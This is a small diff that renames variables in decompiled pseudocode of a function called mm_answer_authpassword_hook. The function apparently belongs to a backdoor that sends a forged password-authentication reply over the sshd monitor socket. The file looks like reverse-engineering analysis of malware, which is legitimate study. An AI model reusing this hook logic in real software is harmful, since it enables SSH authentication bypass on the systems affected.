@@ -20,8 +20,8 @@ int mm_answer_authpassword_hook(ssh *ssh,int sock,sshbuf *m)
   libc_imports_t *funcs;
   long lVar1;
   int iVar2;
-  size_t count;
-  libc_imports_t **buffer;
+  size_t reply_len;
+  void *reply_buf;
   uint *auth_reply;
   sshd_payload_ctx_t *payload_ctx;
   libc_imports_t *libc_imports;
@@ -41,16 +41,16 @@ int mm_answer_authpassword_hook(ssh *ssh,int sock,sshbuf *m)
     iVar2 = 0;
   }
   else {
-    count = (size_t)*(ushort *)(lVar1 + 0x90);
+    reply_len = (size_t)*(ushort *)(lVar1 + 0x90);
     if ((*(ushort *)(lVar1 + 0x90) == 0) ||
-       (buffer = *(libc_imports_t ***)(lVar1 + 0x98), buffer == (libc_imports_t **)0x0)) {
-      buffer = &libc_imports;
+       (reply_buf = *(libc_imports_t ***)(lVar1 + 0x98), reply_buf == (libc_imports_t **)0x0)) {
+      reply_buf = &libc_imports;
       uStack_d = 1;
       *(uint *)((u8 *)&libc_imports + 4) = *(uint *)(lVar1 + 0x40) & 0xff;
       *(uint *)&libc_imports = (-(uint)(*(int *)(lVar1 + 0xb8) == 0) & 0xfc000000) + 0x9000000;
-      count = (ulong)((uint)libc_imports >> 0x18) + 4;
+      reply_len = (ulong)((uint)libc_imports >> 0x18) + 4;
     }
-    fd_write(sock,buffer,count,funcs);
+    fd_write(sock,reply_buf,reply_len,funcs);
     **(undefined8 **)(lVar1 + 0xa0) = *(undefined8 *)(lVar1 + 0xd0);
     iVar2 = 1;
   }
